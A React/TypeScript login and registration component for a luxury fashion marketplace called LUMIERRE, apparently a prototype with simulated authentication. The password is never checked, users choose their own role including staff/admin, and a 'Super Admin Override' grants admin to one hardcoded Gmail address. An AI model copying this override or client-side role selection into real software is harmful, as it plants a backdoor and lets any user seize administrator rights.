import React, { useState } from 'react';
import { ArrowRight, Loader, Shield } from 'lucide-react';
import { UserRole, ViewState } from '../types';

interface AuthViewProps {
  onLogin: (role: UserRole) => void;
  onNavigate: (view: ViewState) => void;
}

export const AuthView: React.FC<AuthViewProps> = ({ onLogin, onNavigate }) => {
  const [isRegister, setIsRegister] = useState(false);
  const [selectedRole, setSelectedRole] = useState<UserRole>(UserRole.BUYER);
  const [isLoading, setIsLoading] = useState(false);

  // Form states
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [brandName, setBrandName] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    
    // Simulate API network delay for luxury feel
    setTimeout(() => {
      // Super Admin Override for specific user
      if (email.toLowerCase() === 'instantassetrecovery830@gmail.com') {
        onLogin(UserRole.ADMIN);
      } else {
        onLogin(selectedRole);
      }
      setIsLoading(false);
    }, 1500);
  };

  return (
    <div className="min-h-screen w-full flex bg-luxury-cream">
      {/* Editorial Image Section (Hidden on mobile) */}
      <div className="hidden lg:block w-1/2 relative overflow-hidden">
        <div className="absolute inset-0 bg-black/10 z-10"></div>
        <img 
          src="https://images.unsplash.com/photo-1509631179647-0177331693ae?q=80&w=1888&auto=format&fit=crop" 
          alt="Editorial Fashion" 
          className="w-full h-full object-cover animate-fade-in"
        />
        <div className="absolute bottom-12 left-12 z-20 text-white">
          <p className="text-xs font-bold uppercase tracking-[0.3em] mb-4">LUMIERRE Membership</p>
          <h2 className="text-5xl font-serif italic leading-tight">Join the<br/>Avant-Garde.</h2>
        </div>
      </div>

      {/* Form Section */}
      <div className="w-full lg:w-1/2 flex items-center justify-center p-8 lg:p-24 bg-white relative">
        <button 
          onClick={() => onNavigate('LANDING')}
          className="absolute top-8 right-8 text-xs font-bold uppercase tracking-widest hover:text-luxury-gold transition-colors"
        >
          Close
        </button>

        <div className="w-full max-w-md animate-slide-up">
          <div className="mb-12">
            <h1 className="text-3xl font-serif italic mb-2">
              {isRegister ? 'Apply for Access' : 'Welcome Back'}
            </h1>
            <p className="text-gray-500 text-sm">
              {isRegister 
                ? 'Create an account to access exclusive collections and drops.' 
                : 'Sign in to manage your wishlist and orders.'}
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-8">
            {/* Role Selection */}
            <div className="grid grid-cols-3 gap-2 mb-8">
              <button
                type="button"
                onClick={() => setSelectedRole(UserRole.BUYER)}
                className={`py-3 text-[10px] font-bold uppercase tracking-widest border transition-all ${
                  selectedRole === UserRole.BUYER 
                    ? 'border-black bg-black text-white' 
                    : 'border-gray-200 text-gray-400 hover:border-black hover:text-black'
                }`}
              >
                Private Client
              </button>
              <button
                type="button"
                onClick={() => setSelectedRole(UserRole.VENDOR)}
                className={`py-3 text-[10px] font-bold uppercase tracking-widest border transition-all ${
                  selectedRole === UserRole.VENDOR 
                    ? 'border-black bg-black text-white' 
                    : 'border-gray-200 text-gray-400 hover:border-black hover:text-black'
                }`}
              >
                Designer
              </button>
              <button
                type="button"
                onClick={() => setSelectedRole(UserRole.ADMIN)}
                className={`py-3 text-[10px] font-bold uppercase tracking-widest border transition-all flex items-center justify-center gap-1 ${
                  selectedRole === UserRole.ADMIN 
                    ? 'border-black bg-black text-white' 
                    : 'border-gray-200 text-gray-400 hover:border-black hover:text-black'
                }`}
              >
                <Shield size={12} /> Staff
              </button>
            </div>

            <div className="space-y-6">
              {isRegister && selectedRole === UserRole.VENDOR && (
                <div className="relative group">
                  <input 
                    type="text" 
                    value={brandName}
                    onChange={(e) => setBrandName(e.target.value)}
                    required
                    className="w-full py-3 border-b border-gray-200 outline-none text-luxury-black bg-transparent focus:border-luxury-black transition-colors peer placeholder-transparent"
                    id="brand"
                    placeholder="Brand Name"
                  />
                  <label 
                    htmlFor="brand"
                    className="absolute left-0 -top-3.5 text-xs text-gray-400 transition-all peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-400 peer-placeholder-shown:top-3 peer-focus:-top-3.5 peer-focus:text-xs peer-focus:text-gray-600"
                  >
                    Brand / Atelier Name
                  </label>
                </div>
              )}

              <div className="relative group">
                <input 
                  type="email" 
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                  className="w-full py-3 border-b border-gray-200 outline-none text-luxury-black bg-transparent focus:border-luxury-black transition-colors peer placeholder-transparent"
                  id="email"
                  placeholder="Email"
                />
                <label 
                  htmlFor="email"
                  className="absolute left-0 -top-3.5 text-xs text-gray-400 transition-all peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-400 peer-placeholder-shown:top-3 peer-focus:-top-3.5 peer-focus:text-xs peer-focus:text-gray-600"
                >
                  Email Address
                </label>
              </div>

              <div className="relative group">
                <input 
                  type="password" 
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                  className="w-full py-3 border-b border-gray-200 outline-none text-luxury-black bg-transparent focus:border-luxury-black transition-colors peer placeholder-transparent"
                  id="password"
                  placeholder="Password"
                />
                <label 
                  htmlFor="password"
                  className="absolute left-0 -top-3.5 text-xs text-gray-400 transition-all peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-400 peer-placeholder-shown:top-3 peer-focus:-top-3.5 peer-focus:text-xs peer-focus:text-gray-600"
                >
                  Password
                </label>
              </div>
            </div>

            <div className="pt-4">
              <button 
                type="submit" 
                disabled={isLoading}
                className="w-full bg-luxury-black text-white py-5 flex justify-center items-center gap-3 text-xs font-bold uppercase tracking-[0.2em] hover:bg-luxury-gold transition-colors disabled:opacity-70"
              >
                {isLoading ? (
                  <Loader className="animate-spin" size={16} />
                ) : (
                  <>
                    {isRegister ? 'Complete Registration' : 'Secure Sign In'}
                    <ArrowRight size={16} />
                  </>
                )}
              </button>
            </div>
          </form>

          <div className="mt-8 text-center">
            <p className="text-gray-500 text-sm">
              {isRegister ? 'Already a member?' : 'New to LUMIERRE?'}
              <button 
                onClick={() => setIsRegister(!isRegister)}
                className="ml-2 font-bold text-black uppercase tracking-wider text-xs hover:text-luxury-gold transition-colors border-b border-black pb-0.5"
              >
                {isRegister ? 'Sign In' : 'Apply Now'}
              </button>
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};